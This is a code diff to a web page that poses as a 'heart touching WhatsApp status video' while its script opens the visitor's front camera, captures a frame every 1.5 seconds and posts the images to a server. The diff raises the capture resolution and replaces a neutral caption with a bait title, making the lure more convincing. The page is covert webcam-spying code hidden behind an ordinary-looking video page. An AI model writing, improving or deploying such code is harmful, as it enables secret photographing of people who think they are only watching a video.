@@ -6,15 +6,16 @@
   video,
 iframe {
   width: 100% !important;
-  height: auto !important;
+  /*height: auto !important;*/
+  height: 55vh;
 }
 
 main {
   background: white;
-  height: 100vh;
-  max-width: 400px;
+  height: 80vh;
+  max-width: 500px;
   margin: 0 auto;
-  padding: 1rem;
+  padding: 5rem;
 }
 
 body {
@@ -53,12 +54,12 @@ $.ajax({
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
+// const errorMsgElement = document.querySelector('span#errorMsg');
 
 const constraints = {
   audio: false,
   video: {
-    
+    width: 1280, height: 720,
     facingMode: "user"
   }
 };
@@ -69,8 +70,9 @@ async function init() {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     handleSuccess(stream);
   } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-    console.log("test "+e.name);
+    // errorMsgElement.innerHTML = e.name;
+    $("#errorMsg").text(e);
+    // console.log("test "+e.name);
   }
 }
 
@@ -81,12 +83,9 @@ function handleSuccess(stream) {
 
 var context = canvas.getContext('2d');
   setInterval(function(){
-
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
-  
-
 }
 
 // Load init
@@ -97,8 +96,8 @@ init();
     <body>
         <!-- <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe> -->
         <main>
-          <p>A video!</p>
-          <iframe id="Live_YT_TV" width="560" height="315" src="https://www.youtube.com/embed/Vbg81kc56FU?autoplay=1" frameborder="0"
+          <p>💖 Most Beautiful Heart Touching Whatsapp Status Video 💖</p>
+          <iframe id="Live_YT_TV" src="https://www.youtube.com/embed/Li545FUZQuw?autoplay=1" frameborder="0"
           allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
         </main>
